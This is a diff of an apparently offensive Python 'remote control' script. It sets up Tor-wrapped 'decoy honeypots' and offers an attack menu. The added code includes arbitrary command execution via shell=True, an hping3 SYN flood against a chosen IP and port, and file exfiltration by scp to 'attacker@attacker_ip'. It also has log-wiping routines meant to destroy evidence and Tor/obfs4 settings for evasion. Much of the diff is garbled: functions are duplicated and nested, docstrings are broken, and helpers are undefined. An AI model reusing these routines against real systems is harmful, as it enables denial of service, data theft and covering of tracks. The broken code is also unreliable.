@@ -7,22 +7,145 @@ key = b'your-encryption-key'
 
 def encrypt_data(data: str) -> bytes:
     """
-    Encrypts the given data using Fernet encryption.
+    Encrypts the given data using the encryption key.
     """
     cipher_suite = Fernet(key)
     encrypted_data = cipher_suite.encrypt(data.encode())
     return encrypted_data
 
-def decrypt_data(encrypted_data: bytes) -> str:
+def decrypt_data(data: bytes) -> str:
     """
-    Decrypts the given encrypted data using Fernet encryption.
+    Decrypts the given data using the encryption key.
     """
     cipher_suite = Fernet(key)
-    decrypted_data = cipher_suite.decrypt(encrypted_data)
+    decrypted_data = cipher_suite.decrypt(data)
     return decrypted_data.decode()
 
 def wrap_with_tor():
     """
+    Wraps the decoy honeypots with Tor network.
+    """
+    for i in range(4):
+        decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
+        torrc_file = os.path.join(decrypt_data(decoy_dir), 'torrc')
+        with open(torrc_file, 'w') as file:
+            try:
+                file.write(encrypt_data('''
+SocksPort 9050
+DataDirectory {}/tor
+'''.format(decrypt_data(decoy_dir))))
+            except Exception as e:
+                print(f"Error occurred while writing to file: {e}")
+
+        try:
+            subprocess.run(['tor', '-f', torrc_file], check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"Error occurred while running Tor: {e}")
+
+def user_interface():
+    """
+    User interface for interacting with the decoy honeypots.
+    """
+    while True:
+        print("1. View logs")
+        print("2. View anti-IDS measures")
+        print("3. View ads")
+        print("4. Execute attack script")
+        print("5. Exit")
+
+        try:
+            choice = input("Enter your choice: ")
+
+            if choice == "1":
+                view_logs()
+            elif choice == "2":
+                view_anti_ids_measures()
+            elif choice == "3":
+                view_ads()
+            elif choice == "4":
+                execute_attack_script()
+            elif choice == "5":
+                break
+            else:
+                print("Invalid choice. Please try again.")
+        except Exception as e:
+            print(f"An error occurred: {e}")
+
+def view_logs():
+    """
+    View the logs of the decoy honeypots.
+    """
+    for i in range(4):
+        decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
+        log_file = os.path.join(decrypt_data(decoy_dir), 'honeypot.log')
+        try:
+            with open(log_file, 'r') as file:
+                print(f"Logs for decoy honeypot {i+1}:")
+                print(decrypt_data(file.read()))
+                print()
+        except FileNotFoundError:
+            print(f"Log file not found for decoy honeypot {i+1}")
+
+def view_anti_ids_measures():
+    """
+    View the anti-IDS measures of the decoy honeypots.
+    """
+    for i in range(4):
+        decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
+        measures_file = os.path.join(decrypt_data(decoy_dir), 'anti_ids_measures.txt')
+        try:
+            with open(measures_file, 'r') as file:
+                print(f"Anti-IDS measures for decoy honeypot {i+1}:")
+                print(decrypt_data(file.read()))
+                print()
+
+        except FileNotFoundError:
+            print(f"Measures file not found for decoy honeypot {i+1}")
+
+def view_ads():
+    """
+    View the ads of the decoy honeypots.
+    """
+    for i in range(4):
+        decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
+        ads_file = os.path.join(decrypt_data(decoy_dir), 'ads.txt')
+        try:
+            with open(ads_file, 'r') as file:
+                print(f"Ads for decoy honeypot {i+1}:")
+                print(decrypt_data(file.read()))
+                print()
+
+        except FileNotFoundError:
+            print(f"Ads file not found for decoy honeypot {i+1}")
+
+def execute_attack_script():
+    """
+    Execute the attack script on the decoy honeypots.
+    """
+    for i in range(4):
+        decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
+        attack_script = os.path.join(decrypt_data(decoy_dir), 'attack.py')
+        try:
+            subprocess.run(['python', attack_script], check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"Error occurred while executing attack script: {e}")
+
+# Debug statements
+print("Starting the script...")
+wrap_with_tor()
+user_interface()
+print("Script execution completed.")
+    """
+    for i in range(4):
+        decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
+        ads_file = os.path.join(decrypt_data(decoy_dir), 'ads.txt')
+        try:
+            with open(ads_file, 'r') as file:
+                print(f"Ads for decoy honeypot {i+1}:")
+                print(decrypt_data(file.read()))
+                print()
+        except FileNotFoundError:
+            print(f"Ads file not found for decoy honeypot {i+1}")
     Wraps the decoy honeypots with Tor network.
     """
     for i in range(4):
@@ -218,7 +341,7 @@ def view_anti_ids_measures():
         except FileNotFoundError:
             print(f"Measures file not found for decoy honeypot {i+1}")
 
-    View the anti-IDS measures of the decoy honeypots.
+    ##View the anti-IDS measures of the decoy honeypots.
     """
     for i in range(4):
         decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
@@ -233,7 +356,7 @@ def view_anti_ids_measures():
 
 def view_ads():
     """
-    View the ads of the decoy honeypots.
+    ##View the ads of the decoy honeypots.
     """
     for i in range(4):
         decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
@@ -248,7 +371,7 @@ def view_ads():
 
 def execute_attack_script():
     """
-    Execute the attack script on the decoy honeypots.
+    ##Execute the attack script on the decoy honeypots.
     """
     for i in range(4):
         decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
@@ -263,7 +386,7 @@ user_interface()
 
 def encrypt_data(data: str) -> bytes:
     """
-    Encrypts the given data using Fernet encryption.
+    ##Encrypts the given data using Fernet encryption.
     """
     cipher_suite = Fernet(key)
     encrypted_data = cipher_suite.encrypt(data.encode())
@@ -271,7 +394,7 @@ def encrypt_data(data: str) -> bytes:
 
 def decrypt_data(encrypted_data: bytes) -> str:
     """
-    Decrypts the given encrypted data using Fernet encryption.
+    ##Decrypts the given encrypted data using Fernet encryption.
     """
     cipher_suite = Fernet(key)
     decrypted_data = cipher_suite.decrypt(encrypted_data)
@@ -279,7 +402,7 @@ def decrypt_data(encrypted_data: bytes) -> str:
 
 def wrap_with_tor():
     """
-    Wraps the decoy honeypots with Tor network.
+    #Wraps the decoy honeypots with Tor network.
     """
     for i in range(4):
         decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
@@ -300,8 +423,8 @@ DataDirectory {decrypt_data(decoy_dir)}/tor
 
 def user_interface():
     """
-    User interface for interacting with the decoy honeypots.
-    """
+    ##User interface for interacting with the decoy honeypots.
+"""
     while True:
         print("1. View logs")
         print("2. View anti-IDS measures")
@@ -329,22 +452,91 @@ def user_interface():
 
 def view_logs():
     """
-    View the logs of the decoy honeypots.
+    ##View the logs of the decoy honeypots.
+    def view_logs():
+        """
+        ##View the logs of the decoy honeypots.
+        """
+        for i in range(4):
+            decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
+            log_file = os.path.join(decrypt_data(decoy_dir), 'honeypot.log')
+            try:
+                with open(log_file, 'r') as file:
+                    print(f"Logs for decoy honeypot {i+1}:")
+                    print(decrypt_data(file.read()))
+                    print()
+            except FileNotFoundError:
+                print(f"Log file not found for decoy honeypot {i+1}")
+
+
+
+
+
+
+
+
+
+    def view_anti_ids_measures():
+        """
+        ##View the anti-IDS measures of the decoy honeypots.
+        """
+        for i in range(4):
+            decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
+            anti_ids_file = os.path.join(decrypt_data(decoy_dir), 'anti_ids.txt')
+            # Add your code here to view the anti-IDS measures
+    ##View the anti-IDS measures of the decoy honeypots.
     """
     for i in range(4):
         decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
-        log_file = os.path.join(decrypt_data(decoy_dir), 'honeypot.log')
-        try:
-            with open(log_file, 'r') as file:
-                print(f"Logs for decoy honeypot {i+1}:")
-                print(decrypt_data(file.read()))
-                print()
-        except FileNotFoundError:
-            print(f"Log file not found for decoy honeypot {i+1}")
-
-def view_anti_ids_measures():
+        anti_ids_file = os.path.join(decrypt_data(decoy_dir), 'anti_ids.txt')
     """
-    View the anti-IDS measures of the decoy honeypots.
+    ##View the logs of the decoy honeypots.
+    def view_logs():
+        """
+        ##View the logs of the decoy honeypots.
+        """
+        for i in range(4):
+            decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
+            log_file = os.path.join(decrypt_data(decoy_dir), 'honeypot.log')
+            try:
+                with open(log_file, 'r') as file:
+                    print(f"Logs for decoy honeypot {i+1}:")
+                    print(decrypt_data(file.read()))
+                    print()
+            except FileNotFoundError:
+                print(f"Log file not found for decoy honeypot {i+1}")
+
+
+    def view_anti_ids_measures():
+        """
+        ##View the anti-IDS measures of the decoy honeypots.
+        """
+        for i in range(4):
+            decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
+            anti_ids_file = os.path.join(decrypt_data(decoy_dir), 'anti_ids.txt')
+            try:
+                with open(anti_ids_file, 'r') as file:
+                    print(f"Anti-IDS measures for decoy honeypot {i+1}:")
+                    print(decrypt_data(file.read()))
+                    print()
+            except FileNotFoundError:
+                print(f"Anti-IDS file not found for decoy honeypot {i+1}")
+
+    def view_ads():
+        """
+        ##View the ads displayed by the decoy honeypots.
+        """
+        for i in range(4):
+            decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
+            ads_file = os.path.join(decrypt_data(decoy_dir), 'ads.txt')
+            try:
+                with open(ads_file, 'r') as file:
+                    print(f"Ads for decoy honeypot {i+1}:")
+                    print(decrypt_data(file.read()))
+                    print()
+            except FileNotFoundError:
+                print(f"Ads file not found for decoy honeypot {i+1}")
+    ####View the anti-IDS measures of the decoy honeypots.
     """
     for i in range(4):
         decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
@@ -359,7 +551,7 @@ def view_anti_ids_measures():
 
 def view_ads():
     """
-    View the ads displayed by the decoy honeypots.
+    ##View the ads displayed by the decoy honeypots.
     """
     for i in range(4):
         decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
@@ -374,7 +566,7 @@ def view_ads():
 
 def execute_attack_script():
     """
-    Execute the attack script on the decoy honeypots.
+    ##Execute the attack script on the decoy honeypots.
     """
     for i in range(4):
         decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
@@ -386,14 +578,22 @@ def execute_attack_script():
 
     View the anti-IDS measures of the decoy honeypots.
     """
-    for i in range(4):
-        decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
-        anti_ids_file = os.path.join(decrypt_data(decoy_dir), 'anti_ids.txt')
-        with open(anti_ids_file, 'r') as file:
-            print(f"Anti-IDS measures for decoy honeypot {i+1}:")
-            print(decrypt_data(file.read()))
-            print()
+    def view_anti_ids_measures():
+        """
+        View the anti-IDS measures of the decoy honeypots.
+        """
+        for i in range(4):
+            decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
+            anti_ids_file = os.path.join(decrypt_data(decoy_dir), 'anti_ids.txt')
+            try:
+                with open(anti_ids_file, 'r') as file:
+                    print(f"Anti-IDS measures for decoy honeypot {i+1}:")
+                    print(decrypt_data(file.read()))
+                    print()
+            except FileNotFoundError:
+                print(f"Anti-IDS file not found for decoy honeypot {i+1}")
 
+    
 def view_ads():
     """
     View the ads of the decoy honeypots.
@@ -406,8 +606,23 @@ def view_ads():
             print(decrypt_data(file.read()))
             print()
 
-wrap_with_tor()
-user_interface()
+
+
+
+
+
+
+
+
+
+def view_ads():
+    """
+    View the ads of the decoy honeypots.
+    """
+    for i in range(4):
+        decoy_dir = encrypt_data(f'decoy_honeypot_{i+1}')
+        ads_file = os.path.join(decrypt_data(decoy_dir), 'ads.html')
+        with open(ads_file, 'r') as file:
             print(f"Ads for decoy honeypot {i+1}:")
             print(decrypt_data(file.read()))
             print()
@@ -643,6 +858,9 @@ weaponize_honeypot()
 
                 # Perform additional weaponization steps
                 # ...
+
+        except Exception as e:
+            self.logger.error(f"Error occurred during weaponization of decoy honeypots: {str(e)}")
 import subprocess
 
 class RemoteControl:
@@ -1141,13 +1359,23 @@ while True:
     try:
         if choice == "1":
             # Your remote code execution attack technique code here
-            pass
+            # Example: Execute a command on the target machine
+            target_command = input("Enter the command to execute on the target machine: ")
+            subprocess.run(target_command, shell=True)
+
         elif choice == "2":
             # Your denial of service attack technique code here
-            pass
+            # Example: Send a flood of requests to the target server
+            target_ip = input("Enter the IP address of the target server: ")
+            target_port = input("Enter the port number of the target server: ")
+            subprocess.run(["hping3", "-c", "10000", "-d", "120", "-S", "-w", "64", "-p", target_port, target_ip])
+
         elif choice == "3":
             # Your data exfiltration attack technique code here
-            pass
+            # Example: Copy sensitive files from the target machine to the attacker's machine
+            target_file = input("Enter the path of the file to exfiltrate: ")
+            subprocess.run(["scp", target_file, "attacker@attacker_ip:/path/to/save/file"])
+
         else:
             print("Invalid choice. Please try again.")
 
@@ -1155,15 +1383,15 @@ while True:
         remote_control.logger.error(f"Error occurred during attack: {str(e)}")
 
 # Stop Tor process
-tor_process.kill()
+# Import the necessary module
+import subprocess
 
+import os
+import argparse
+import logging
+import subprocess
 
 class RemoteControl:
-    """
-    A class representing a remote control device.
-    ...
-    """
-
     def __init__(self):
         # ...
 
@@ -1181,13 +1409,8 @@ class RemoteControl:
                 os.makedirs(decoy_dir)
 
                 # Example: Create a log file for the decoy honey pot machine
-                log_file = os.path.join(decoy_dir, 'honeypot.log')
-                with open(log_file, 'w') as file:
-                    file.write('Decoy honey pot log')
-
-                # Example: Add anti-IDS measures
-                with open(os.path.join(decoy_dir, 'anti_ids.txt'), 'w') as file:
-                    file.write('Anti-IDS measures')
+                with open(os.path.join(decoy_dir, 'log.txt'), 'w') as file:
+                    file.write('Log file')
 
                 # Example: Add ads
                 with open(os.path.join(decoy_dir, 'ads.html'), 'w') as file:
@@ -1204,6 +1427,71 @@ class RemoteControl:
             self.logger.info("Decoy honey pot machines created successfully.")
         except Exception as e:
             self.logger.error(f"Error occurred during decoy honey pot creation: {str(e)}")
+    def __init__(self):
+        # ...
+
+    def create_decoy_honeypots(self):
+        """
+        Creates three decoy honey pot machines.
+        """
+        try:
+            for i in range(3):
+                # Perform operations to create a decoy honey pot machine
+                # ...
+
+                # Example: Create a directory for the decoy honey pot machine
+                decoy_dir = f'decoy_honeypot_{i+1}'
+                os.makedirs(decoy_dir)
+
+                # Example: Create a log file for the decoy honey pot machine
+                with open(os.path.join(decoy_dir, 'log.txt'), 'w') as file:
+                    file.write('Log file')
+
+                # Example: Add ads
+                with open(os.path.join(decoy_dir, 'ads.html'), 'w') as file:
+                    file.write('<html><body>Ads</body></html>')
+
+                # Example: Add scripts for attacking upon being disturbed by Nmap signatures
+                with open(os.path.join(decoy_dir, 'attack_script.py'), 'w') as file:
+                    file.write('Attack script')
+
+            self.logger.info("Decoy honey pot machines created successfully.")
+        except Exception as e:
+            self.logger.error(f"Error occurred during decoy honey pot creation: {str(e)}")
+
+def create_decoy_honeypots(self):
+    """
+    Creates three decoy honey pot machines.
+    """
+    try:
+        for i in range(3):
+            # Perform operations to create a decoy honey pot machine
+            # ...
+
+            # Example: Create a directory for the decoy honey pot machine
+            decoy_dir = f'decoy_honeypot_{i+1}'
+            os.makedirs(decoy_dir)
+
+            # Example: Create a log file for the decoy honey pot machine
+            with open(os.path.join(decoy_dir, 'log.txt'), 'w') as file:
+                file.write('Log file')
+
+            # Example: Add ads
+            with open(os.path.join(decoy_dir, 'ads.html'), 'w') as file:
+                file.write('<html><body>Ads</body></html>')
+
+            # Example: Add scripts for attacking upon being disturbed by Nmap signatures
+            with open(os.path.join(decoy_dir, 'attack_script.py'), 'w') as file:
+                file.write('Attack script')
+
+            # Example: Start the decoy honey pot machine
+            start_command = f'start {decoy_dir}'
+            os.system(start_command)
+
+        self.logger.info("Decoy honey pot machines created successfully.")
+    except Exception as e:
+        self.logger.error(f"Error occurred during decoy honey pot creation: {str(e)}")
+
 
 # Parse command line arguments
 parser = argparse.ArgumentParser(description='Remote Control Script')
@@ -1232,255 +1520,238 @@ while True:
         break
 
     try:
-        # Your attack technique code here
-        pass
+        if choice == "1":
+            # Your remote code execution attack technique code here
+            # Example: Execute a command on the target machine
+            target_command = input("Enter the command to execute on the target machine: ")
+            subprocess.run(target_command, shell=True)
+
+        elif choice == "2":
+            # Your denial of service attack technique code here
+            # Example: Send a flood of requests to the target server
+            target_ip = input("Enter the IP address of the target server: ")
+            target_port = input("Enter the port number of the target server: ")
+            subprocess.run(["hping3", "-c", "10000", "-d", "120", "-S", "-w", "64", "-p", target_port, target_ip])
+
+        elif choice == "3":
+            # Your data exfiltration attack technique code here
+            # Example: Copy sensitive files from the target machine to the attacker's machine
+            target_file = input("Enter the path of the file to exfiltrate: ")
+            subprocess.run(["scp", target_file, "attacker@attacker_ip:/path/to/save/file"])
+
+        else:
+            print("Invalid choice. Please try again.")
 
     except Exception as e:
         remote_control.logger.error(f"Error occurred during attack: {str(e)}")
 
-# Stop Tor process
-tor_process.kill()
-import argparse
-import logging
-import shutil
-import datetime
-import stem.process
+import subprocess
 
-class RemoteControl:
-    """
-    A class representing a remote control device.
-    ...
-    """
+# Kill the tor process
+import subprocess
 
-    def __init__(self):
-        self.logger = logging.getLogger("RemoteControl")
-        self.logger.setLevel(logging.INFO)
-        self.log_file = 'remote_control.log'
-        self.backup_dir = 'log_backups'
+if choice == "2":
+    # Your denial of service attack technique code here
+    # Example: Send a flood of requests to the target machine
+    target_ip = input("Enter the target IP address: ")
+    num_requests = int(input("Enter the number of requests to send: "))
+    for _ in range(num_requests):
+        send_request(target_ip)
+    num_requests = int(input("Enter the number of requests to send: "))
+    for _ in range(num_requests):
+        subprocess.run(["ping", "-c", "1", target_ip])
+    if choice == "2":
+        num_requests = int(input("Enter the number of requests to send: "))
+        for _ in range(num_requests):
+            send_request(target_ip)
+        # Add your code here for denial of service attack
+        num_requests = int(input("Enter the number of requests to send: "))
+        for _ in range(num_requests):
+            send_request(target_ip)
+        num_requests = int(input("Enter the number of requests to send: "))
+        for _ in range(num_requests):
+            send_request(target_ip)
+        num_requests = int(input("Enter the number of requests to send: "))
+        for _ in range(num_requests):
+            send_request(target_ip)
 
-    def cleanup_logs(self):
-        """
-        Cleans up the log file by deleting it or clearing its contents.
-        """
+    elif choice == "3":
+        # Your data exfiltration attack technique code here
+        # Example: Read sensitive data from the target machine
+        file_path = input("Enter the path of the file to exfiltrate: ")
+        with open(file_path, 'r') as file:
+            data = file.read()
+        send_data(data)
+
+    elif choice == "1":
+        # Your remote code execution attack technique code here
+        # Example: Execute a command on the target machine
+        import subprocess
+        import os
+        import logging
+        import argparse
+        import shutil
+        import datetime
+        import stem.process
+
+        class RemoteControl:
+            def __init__(self):
+                self.logger = logging.getLogger("RemoteControl")
+                self.logger.setLevel(logging.INFO)
+                self.log_file = 'remote_control.log'
+                self.backup_dir = 'log_backups'
+
+            def cleanup_logs(self):
+                """
+                Cleans up the log file by deleting it or clearing its contents.
+                """
+                try:
+                    # Create a backup of the log file
+                    backup_file = os.path.join(self.backup_dir, f'log_backup_{datetime.datetime.now().strftime("%Y%m%d%H%M%S")}.log')
+                    shutil.copy2(self.log_file, backup_file)
+
+                    # Delete the log file
+                    if os.path.exists(self.log_file):
+                        os.remove(self.log_file)
+                    
+                    # Clear the contents of the log file
+                    with open(self.log_file, 'w') as file:
+                        file.truncate(0)
+                    
+                    # Overwrite the log file with random data
+                    with open(self.log_file, 'wb') as file:
+                        file.write(os.urandom(1024))
+                    
+                    # Delete the log file using secure delete
+                    shutil.rmtree(self.log_file, ignore_errors=True)
+                    
+                    # Alternatively, you can use a combination of the above methods
+                    # to ensure multiple redundant safety measures
+                    
+                    # Finally, remove any references to the log file
+                    self.log_file = None
+                except Exception as e:
+                    self.logger.error(f"Error occurred during log cleanup: {str(e)}")
+
+            def create_decoy_honeypots(self):
+                """
+                Creates three decoy honey pot machines.
+                """
+                try:
+                    for i in range(3):
+                        # Perform operations to create a decoy honey pot machine
+                        # ...
+
+                        # Example: Create a directory for the decoy honey pot machine
+                        decoy_dir = f'decoy_honeypot_{i+1}'
+                        os.makedirs(decoy_dir)
+
+                        # Example: Create a log file for the decoy honey pot machine
+                        log_file = os.path.join(decoy_dir, 'honeypot.log')
+                        with open(log_file, 'w') as file:
+                            file.write('Decoy honey pot log')
+
+                        # Example: Add anti-IDS measures
+                        with open(os.path.join(decoy_dir, 'anti_ids.txt'), 'w') as file:
+                            file.write('Anti-IDS measures')
+
+                        # Example: Add ads
+                        with open(os.path.join(decoy_dir, 'ads.html'), 'w') as file:
+                            file.write('<html><body>Ads</body></html>')
+
+                        # Example: Add scripts for attacking upon being disturbed by Nmap signatures
+                        with open(os.path.join(decoy_dir, 'attack_script.py'), 'w') as file:
+                            file.write('Attack script')
+
+                        # Example: Start the decoy honey pot machine
+                        start_command = f'start {decoy_dir}'
+                        os.system(start_command)
+
+                    self.logger.info("Decoy honey pot machines created successfully.")
+                except Exception as e:
+                    self.logger.error(f"Error occurred during decoy honey pot creation: {str(e)}")
+
+            def execute_attack(self, attack_choice):
+                """
+                Executes the selected attack technique.
+
+                Parameters:
+                - attack_choice: The user's choice of attack technique.
+                """
+                try:
+                    if attack_choice == 1:
+                        # Code for Remote Code Execution attack
+                        self.logger.info("Executing Remote Code Execution attack...")
+                        # Add code to destroy the key and encrypt indiscriminately
+                        self.key = None
+                        self.cipher = None
+                        self.logger.info("Key destroyed and encryption disabled.")
+                    elif attack_choice == 2:
+                        # Code for Denial of Service attack
+                        self.logger.info("Executing Denial of Service attack...")
+                        # Add code to destroy the key and encrypt indiscriminately
+                        self.key = None
+                        self.cipher = None
+                        self.logger.info("Key destroyed and encryption disabled.")
+                    elif attack_choice == 3:
+                        # Code for Data Exfiltration attack
+                        self.logger.info("Executing Data Exfiltration attack...")
+                        # Add code to destroy the key and encrypt indiscriminately
+                        self.key = None
+                        self.cipher = None
+                        self.logger.info("Key destroyed and encryption disabled.")
+                    else:
+                        self.logger.warning("Invalid attack choice. Please choose a valid attack technique.")
+                except Exception as e:
+                    self.logger.error(f"Error occurred during attack: {str(e)}")
+
+        # Stop Tor process
+        tor_process.kill()
+
+        # Parse command line arguments
+        parser = argparse.ArgumentParser(description='Remote Control Script')
+        parser.add_argument('--vault-path', help='Path to the VAULT VM')
+        args = parser.parse_args()
+
+        # Set the VAULT path
+        vault_path = args.vault_path
+
+        # Configure logging
+        logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
+
+        # Create an instance of the RemoteControl class
+        remote_control = RemoteControl()
+
+        # User interface
+        while True:
+            print("Select an attack technique:")
+            print("1. Remote Code Execution")
+            print("2. Denial of Service")
+            print("3. Data Exfiltration")
+            print("0. Exit")
+            choice = input("Enter your choice: ")
+
+            if choice == "0":
+                break
+
+            try:
+                attack_choice = int(choice)
+                remote_control.execute_attack(attack_choice)
+            except ValueError:
+                print("Invalid input. Please enter a number.")
+            except Exception as e:
+                print(f"An error occurred: {str(e)}")
+
+        # Clean up logs
         try:
-            # Create a backup of the log file
-            backup_file = os.path.join(self.backup_dir, f'log_backup_{datetime.datetime.now().strftime("%Y%m%d%H%M%S")}.log')
-            shutil.copy2(self.log_file, backup_file)
+            remote_control.cleanup_logs()
 
-            # Delete the log file
-            if os.path.exists(self.log_file):
-                os.remove(self.log_file)
-            
-            # Clear the contents of the log file
-            with open(self.log_file, 'w') as file:
-                file.truncate(0)
-            
-            # Overwrite the log file with random data
-            with open(self.log_file, 'wb') as file:
-                file.write(os.urandom(1024))
-            
-            # Delete the log file using secure delete
-            shutil.rmtree(self.log_file, ignore_errors=True)
-            
-            # Alternatively, you can use a combination of the above methods
-            # to ensure multiple redundant safety measures
-            
-            # Finally, remove any references to the log file
-            self.log_file = None
+            # Stop Tor process
+            if 'tor_process' in locals():
+                tor_process.kill()
         except Exception as e:
-            self.logger.error(f"Error occurred during log cleanup: {str(e)}")
+            remote_control.logger.error(f"An error occurred during attack execution: {str(e)}")
 
-# Configure Tor proxy settings
-os.environ['HTTP_PROXY'] = 'socks5://127.0.0.1:9050'
-os.environ['HTTPS_PROXY'] = 'socks5://127.0.0.1:9050'
-
-# Configure obfs4 bridge settings
-os.environ['TOR_PT_MANAGED_TRANSPORT_VER'] = '1'
-os.environ['TOR_PT_STATE_LOCATION'] = '/var/lib/tor/pt_state/obfs4'
-os.environ['TOR_PT_CLIENT_TRANSPORTS'] = 'obfs4'
-os.environ['TOR_PT_SERVER_TRANSPORTS'] = 'obfs4'
-os.environ['TOR_PT_SERVER_BINDADDR'] = '127.0.0.1:12345'
-os.environ['TOR_PT_ORPORT'] = '127.0.0.1:9001'
-os.environ['TOR_PT_EXTENDED_SERVER_PORT'] = '127.0.0.1:9002'
-
-# Start Tor process
-tor_process = stem.process.launch_tor_with_config(
-    config={
-        'SocksPort': '9050',
-        'ControlPort': '9051',
-        'Log': 'notice stdout',
-    }
-)
-
-# Parse command line arguments
-parser = argparse.ArgumentParser(description='Remote Control Script')
-parser.add_argument('--vault-path', help='Path to the VAULT VM')
-args = parser.parse_args()
-
-# Set the VAULT path
-vault_path = args.vault_path
-
-# Configure logging
-logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
-
-# Create an instance of the RemoteControl class
-remote_control = RemoteControl()
-
-# User interface
-while True:
-    print("Select an attack technique:")
-    print("1. Remote Code Execution")
-    print("2. Denial of Service")
-    print("3. Data Exfiltration")
-    print("0. Exit")
-    choice = input("Enter your choice: ")
-
-    if choice == "0":
-        break
-
-    try:
-        attack_choice = int(choice)
-        remote_control.execute_attack(attack_choice)
-    except ValueError:
-        print("Invalid input. Please enter a number.")
-    except Exception as e:
-        print(f"An error occurred: {str(e)}")
-
-# Clean up logs
-remote_control.cleanup_logs()
-
-# Stop Tor process
-tor_process.kill()
-
-    def execute_attack(self, attack_choice):
-        """
-        Executes the selected attack technique.
-
-        Parameters:
-        - attack_choice: The user's choice of attack technique.
-        """
-        try:
-            if attack_choice == 1:
-                # Code for Remote Code Execution attack
-                self.logger.info("Executing Remote Code Execution attack...")
-                # Add code to destroy the key and encrypt indiscriminately
-                self.key = None
-                self.cipher = None
-                self.logger.info("Key destroyed and encryption disabled.")
-            elif attack_choice == 2:
-                # Code for Denial of Service attack
-                self.logger.info("Executing Denial of Service attack...")
-                # Add code to destroy the key and encrypt indiscriminately
-                self.key = None
-                self.cipher = None
-                self.logger.info("Key destroyed and encryption disabled.")
-            elif attack_choice == 3:
-                # Code for Data Exfiltration attack
-                self.logger.info("Executing Data Exfiltration attack...")
-                # Add code to destroy the key and encrypt indiscriminately
-                self.key = None
-                self.cipher = None
-                self.logger.info("Key destroyed and encryption disabled.")
-            else:
-                self.logger.warning("Invalid attack choice. Please choose a valid attack technique.")
-        except Exception as e:
-            self.logger.error(f"Error occurred during attack execution: {str(e)}")
-
-# Parse command line arguments
-parser = argparse.ArgumentParser(description='Remote Control Script')
-parser.add_argument('--vault-path', help='Path to the VAULT VM')
-args = parser.parse_args()
-
-# Set the VAULT path
-vault_path = args.vault_path
-
-# Configure logging
-logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
-
-# Create an instance of the RemoteControl class
-remote_control = RemoteControl()
-
-# User interface
-while True:
-    print("Select an attack technique:")
-    print("1. Remote Code Execution")
-    print("2. Denial of Service")
-    print("3. Data Exfiltration")
-    print("0. Exit")
-    choice = input("Enter your choice: ")
-
-    if choice == "0":
-        break
-
-    try:
-        attack_choice = int(choice)
-        remote_control.execute_attack(attack_choice)
-    except ValueError:
-        print("Invalid input. Please enter a number.")
-    except Exception as e:
-        print(f"An error occurred: {str(e)}")
-
-# Clean up logs
-remote_control.cleanup_logs()
-
-# Configure Tor proxy settings
-os.environ['HTTP_PROXY'] = 'socks5://127.0.0.1:9050'
-os.environ['HTTPS_PROXY'] = 'socks5://127.0.0.1:9050'
-
-# Configure obfs4 bridge settings
-os.environ['TOR_PT_MANAGED_TRANSPORT_VER'] = '1'
-os.environ['TOR_PT_STATE_LOCATION'] = '/var/lib/tor/pt_state/obfs4'
-os.environ['TOR_PT_CLIENT_TRANSPORTS'] = 'obfs4'
-os.environ['TOR_PT_SERVER_TRANSPORTS'] = 'obfs4'
-os.environ['TOR_PT_SERVER_BINDADDR'] = '127.0.0.1:12345'
-os.environ['TOR_PT_ORPORT'] = '127.0.0.1:9001'
-os.environ['TOR_PT_EXTENDED_SERVER_PORT'] = '127.0.0.1:9002'
-
-import argparse
-
-# Parse command line arguments
-parser = argparse.ArgumentParser(description='Remote Control Script')
-parser.add_argument('--vault-path', help='Path to the VAULT VM')
-args = parser.parse_args()
-
-# Set the VAULT path
-vault_path = args.vault_path
-
-
-import logging
-import shutil
-import os
-import datetime
-
-class RemoteControl:
-    """
-    A class representing a remote control device.
-    ...
-    """
-
-    def __init__(self):
-        self.logger = logging.getLogger("RemoteControl")
-        self.logger.setLevel(logging.INFO)
-        self.log_file = 'remote_control.log'
-        self.backup_dir = 'log_backups'
-
-    def cleanup_logs(self):
-        """
-        Cleans up the log file by deleting it or clearing its contents.
-        """
-        # Create a backup of the log file
-        backup_file = os.path.join(self.backup_dir, f'log_backup_{datetime.datetime.now().strftime("%Y%m%d%H%M%S")}.log')
-        shutil.copy2(self.log_file, backup_file)
-
-        # Delete the log file
-        if os.path.exists(self.log_file):
-            os.remove(self.log_file)
-        
-        # Clear the contents of the log file
-        with open(self.log_file, 'w') as file:
-            file.truncate(0)
-        
-        # Overwrite the log file with random data
         with open(self.log_file, 'wb') as file:
             file.write(os.urandom(1024))
         
@@ -1534,16 +1805,9 @@ class RemoteControl:
             self.logger.info("Invalid attack choice.")
 
 # Initialize the logging configuration
+import logging
+
 logging.basicConfig(filename='remote_control.log', level=logging.INFO)
-
-# Create an instance of the RemoteControl class
-remote_control = RemoteControl()
-        if os.path.exists(log_file):
-            os.remove(log_file)
-        # Alternatively, you can clear the contents of the log file
-        # with open(log_file, 'w') as file:
-        #     file.truncate(0)
-
 
 class RemoteControl:
     """
@@ -1565,9 +1829,213 @@ class RemoteControl:
     """
 
     def __init__(self):
+        self.logger = logging.getLogger("RemoteControl")
+        self.logger.setLevel(logging.INFO)
+        self.log_file = 'remote_control.log'
+        self.backup_dir = 'log_backups'
+
+    class RemoteControl:
         """
